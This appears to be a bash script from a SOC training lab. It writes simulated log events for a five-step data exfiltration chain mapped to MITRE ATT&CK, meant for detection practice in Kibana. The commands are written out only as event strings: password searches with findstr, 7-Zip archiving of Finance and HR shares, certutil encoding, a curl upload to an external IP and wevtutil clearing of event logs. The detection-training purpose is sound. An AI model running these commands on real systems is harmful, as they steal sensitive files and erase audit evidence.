#!/usr/bin/env bash
# ============================================================================
# SOC Lab Docker – Data Exfiltration Attack Simulation
# ============================================================================
#
# Simulates a data exfiltration scenario: an attacker collects sensitive
# files, archives them, and transfers them to an external destination via
# a non-standard port. Includes process and network events throughout.
#
# Event chain simulated:
#   1. Reconnaissance – directory enumeration on target
#   2. Staging – archiving files with 7-zip/tar
#   3. Encoding – base64 encoding of archive (defense evasion)
#   4. Exfiltration – large outbound transfer over non-standard port
#   5. Cleanup – deletion of staged files
#
# MITRE ATT&CK:
#   T1005     – Data from Local System
#   T1074.001 – Data Staged: Local Data Staging
#   T1560.001 – Archive Collected Data: Archive via Utility
#   T1048.003 – Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol
#   T1070.004 – Indicator Removal: File Deletion
#
# Usage:
#   bash scripts/exfiltration_simulation.sh [options]
#
# Options (env vars):
#   SOURCE_HOST    – Host where data is collected (default: fileserver-01)
#   EXFIL_IP       – External destination IP (default: random)
#   EXFIL_PORT     – Destination port (default: 8080)
#   EXFIL_BYTES    – Bytes transferred (default: 52428800 = 50MB)
#   TARGET_USER    – Compromised account (default: jsmith)
#   LOG_FILE       – Output log file
#
# Expected detections:
#   - Large outbound transfer over non-standard port
#   - Archiving tools (7zip/tar) touching sensitive directories
#   - File deletion following large transfer
# ============================================================================

set -euo pipefail
SCRIPT_NAME="exfiltration_simulation"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/utils.sh"

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
SOURCE_HOST="${SOURCE_HOST:-fileserver-01}"
EXFIL_IP="${EXFIL_IP:-$(random_external_ip)}"
EXFIL_PORT="${EXFIL_PORT:-8080}"
EXFIL_BYTES="${EXFIL_BYTES:-52428800}"   # 50 MB
TARGET_USER="${TARGET_USER:-jsmith}"
SOURCE_IP="$(random_internal_ip)"
STAGE_DIR="C:\\Users\\${TARGET_USER}\\AppData\\Local\\Temp"

# ---------------------------------------------------------------------------
# Pre-flight
# ---------------------------------------------------------------------------
log_info "============================================"
log_info "  Data Exfiltration Simulation"
log_info "============================================"
log_info "Source host  : ${SOURCE_HOST}"
log_info "Exfil target : ${EXFIL_IP}:${EXFIL_PORT}"
log_info "Transfer size: $(( EXFIL_BYTES / 1024 / 1024 )) MB"
log_info "Target user  : ${TARGET_USER}"
log_info "Output file  : ${LOG_FILE}"
log_info "--------------------------------------------"

if ! check_lab_running 2>/dev/null; then
    log_warn "Lab not running. Events will be written to file only."
fi

# ---------------------------------------------------------------------------
# Step 1: Reconnaissance – enumerate sensitive directories
# ---------------------------------------------------------------------------
log_step "Step 1 – Reconnaissance: enumerating file system"

recon_cmds=(
    "dir C:\\Users\\ /s /b"
    "dir C:\\Users\\${TARGET_USER}\\Documents\\ /s /b"
    "dir \\\\fileserver-01\\Finance\\ /s /b"
    "dir \\\\fileserver-01\\HR\\ /s /b"
    "findstr /si password *.txt *.xml *.config"
)

for cmd in "${recon_cmds[@]}"; do
    binary="${cmd%% *}"
    event=$(make_process_event "cmd.exe" "${binary}.exe" "$cmd" "$TARGET_USER" "$SOURCE_HOST")
    write_event "$event"
    sleep 0.15
done

log_info "  → ${#recon_cmds[@]} reconnaissance events written"
step_delay

# ---------------------------------------------------------------------------
# Step 2: Staging – collect and archive files
# ---------------------------------------------------------------------------
log_step "Step 2 – Staging: archiving sensitive files with 7-Zip"

archive_cmds=(
    "7z.exe a ${STAGE_DIR}\\backup_20240115.7z C:\\Users\\${TARGET_USER}\\Documents\\ -p infected123"
    "7z.exe a ${STAGE_DIR}\\backup_20240115.7z \\\\fileserver-01\\Finance\\ -p infected123"
    "7z.exe a ${STAGE_DIR}\\backup_20240115.7z \\\\fileserver-01\\HR\\ -p infected123"
)

for cmd in "${archive_cmds[@]}"; do
    event=$(make_process_event "cmd.exe" "7z.exe" "$cmd" "$TARGET_USER" "$SOURCE_HOST")
    write_event "$event"
    sleep 0.3
done

log_info "  → ${#archive_cmds[@]} staging events written"
step_delay

# ---------------------------------------------------------------------------
# Step 3: Encoding – base64 encode archive (defense evasion)
# ---------------------------------------------------------------------------
log_step "Step 3 – Defense evasion: encoding archive with certutil"

encode_cmd="certutil.exe -encode ${STAGE_DIR}\\backup_20240115.7z ${STAGE_DIR}\\upload.b64"
event=$(make_process_event "cmd.exe" "certutil.exe" "$encode_cmd" "$TARGET_USER" "$SOURCE_HOST")
write_event "$event"
step_delay

# ---------------------------------------------------------------------------
# Step 4: Exfiltration – large outbound transfer
# ---------------------------------------------------------------------------
log_step "Step 4 – Exfiltration: transferring $(( EXFIL_BYTES / 1024 / 1024 ))MB to ${EXFIL_IP}:${EXFIL_PORT}"

# Curl command used to send data out
exfil_cmd="curl.exe -X POST http://${EXFIL_IP}:${EXFIL_PORT}/upload -F file=@${STAGE_DIR}\\upload.b64"
event=$(make_process_event "cmd.exe" "curl.exe" "$exfil_cmd" "$TARGET_USER" "$SOURCE_HOST")
write_event "$event"

# Network transfer event – large bytes_out is the key detection signal
event=$(make_network_event "$SOURCE_IP" "$EXFIL_IP" "$EXFIL_PORT" "$EXFIL_BYTES" "$SOURCE_HOST")
write_event "$event"

# Second burst (split transfer)
half=$(( EXFIL_BYTES / 2 ))
sleep 1
event=$(make_network_event "$SOURCE_IP" "$EXFIL_IP" "$EXFIL_PORT" "$half" "$SOURCE_HOST")
write_event "$event"

log_info "  → Exfiltration events written ($(( EXFIL_BYTES / 1024 ))KB transferred)"
step_delay

# ---------------------------------------------------------------------------
# Step 5: Cleanup – delete staged files
# ---------------------------------------------------------------------------
log_step "Step 5 – Cleanup: deleting staged archive"

cleanup_cmds=(
    "del /f /q ${STAGE_DIR}\\backup_20240115.7z"
    "del /f /q ${STAGE_DIR}\\upload.b64"
    "wevtutil.exe cl Security"
    "wevtutil.exe cl System"
)

for cmd in "${cleanup_cmds[@]}"; do
    binary="${cmd%% *}"
    event=$(make_process_event "cmd.exe" "${binary%%.*}.exe" "$cmd" "$TARGET_USER" "$SOURCE_HOST")
    write_event "$event"
    sleep 0.1
done

log_info "  → ${#cleanup_cmds[@]} cleanup events written"

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
log_info "============================================"
log_info "  Simulation Complete"
log_info "============================================"
log_info "Total events : $(( ${#recon_cmds[@]} + ${#archive_cmds[@]} + 2 + 3 + ${#cleanup_cmds[@]} ))"
log_info "Output file  : ${LOG_FILE}"
log_info ""
log_info "Expected detections:"
log_info "  - Large outbound transfer (${EXFIL_BYTES} bytes) to ${EXFIL_IP} (T1048)"
log_info "  - 7-Zip archiving sensitive directories (T1560)"
log_info "  - certutil.exe encoding (T1027)"
log_info "  - Event log clearing (T1070.001)"
log_info ""
log_info "Key fields to look for in Kibana:"
log_info "  source.bytes > 10000000"
log_info "  destination.ip: ${EXFIL_IP}"
log_info "  process.name: (7z.exe OR certutil.exe OR curl.exe)"
